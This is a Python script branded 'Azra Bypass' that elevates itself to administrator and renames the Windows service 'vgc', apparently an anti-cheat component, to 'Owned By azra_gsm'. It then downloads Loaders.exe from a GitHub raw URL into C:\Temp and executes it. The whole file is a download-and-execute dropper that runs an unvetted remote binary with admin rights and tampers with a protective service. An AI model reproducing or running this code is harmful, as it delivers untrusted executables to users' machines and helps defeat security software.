import os
import sys
import ctypes
import subprocess
import urllib.request
import traceback

# Colorama ile renkleri destekle
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("Colorama yüklü değil. Yüklemek için: pip install colorama")
    sys.exit(1)

# Hata log dosyası
LOG_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vgc_change_and_run.log")

def log_exc(e):
    with open(LOG_PATH, "a", encoding="utf-8") as f:
        f.write("=== ERROR ===\n")
        traceback.print_exc(file=f)
        f.write("\n")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        log_exc(e)
        return False

def elevate_and_restart():
    try:
        script = os.path.abspath(sys.argv[0])
        params = " ".join(['"' + p + '"' for p in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
    except Exception as e:
        log_exc(e)
    sys.exit(0)

def change_display_name(service_name, new_display_name):
    try:
        # Çıktıyı gizlemek için stdout ve stderr'i DEVNULL'a yönlendir
        subprocess.run(
            ["sc", "config", service_name, f"DisplayName= {new_display_name}"],
            check=True,
            shell=False,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        log_exc(e)
        raise

def download_file(url, dest_path):
    try:
        # Eğer dosya önceden varsa sil
        if os.path.exists(dest_path):
            os.remove(dest_path)
        urllib.request.urlretrieve(url, dest_path)
    except Exception as e:
        log_exc(e)
        raise

def open_file(path):
    try:
        subprocess.Popen([path], shell=True)
    except Exception as e:
        log_exc(e)
        raise

def main():
    service_name = "vgc"
    new_display_name = "Owned By azra_gsm"

    # ================= ASCII BAŞLIK =================
    print(Fore.CYAN + r"""
                             """ + Fore.YELLOW + "Azra Bypass" + Fore.CYAN + r""" 
                 _..-'(                       )`-.._
              ./'. '||\\.       (\_/)       .//||` .`\.
           ./'.|'.'||||\\|..    )O O(    ..|//||||`.`|.`\.
        ./'..|'.|| |||||\`````` '`"'` ''''''/||||| ||.`|..`\.
      ./'.||'.|||| ||||||||||||.     .|||||||||||| |||||.`||.`\.
     /'|||'.|||||| ||||||||||||{     }|||||||||||| ||||||.`|||`\
    '.|||'.||||||| ||||||||||||{     }|||||||||||| |||||||.`|||.`  
   '.||| ||||||||| |/'   ``\||``     ''||/''   `\| ||||||||| |||.`  
   |/' \./'     `\./         \!|\   /|!/         \./'     `\./ `\|  
   V    V         V          }' `\ /' `{          V         V    V  
   `    `         `               V               '         '    '
""")

    DOWNLOAD_URL = "https://github.com/ZeynepGSM3125/license-bot/raw/main/Loaders.exe"

    # Dosya yolu: Temp klasörü
    dest_folder = "C:\\Temp"
    if not os.path.exists(dest_folder):
        os.makedirs(dest_folder)
    dest = os.path.join(dest_folder, "Loaders.exe")

    if not is_admin():
        elevate_and_restart()

    try:
        change_display_name(service_name, new_display_name)
    except Exception:
        sys.exit(1)

    try:
        download_file(DOWNLOAD_URL, dest)
    except Exception:
        sys.exit(1)

    try:
        open_file(dest)
    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
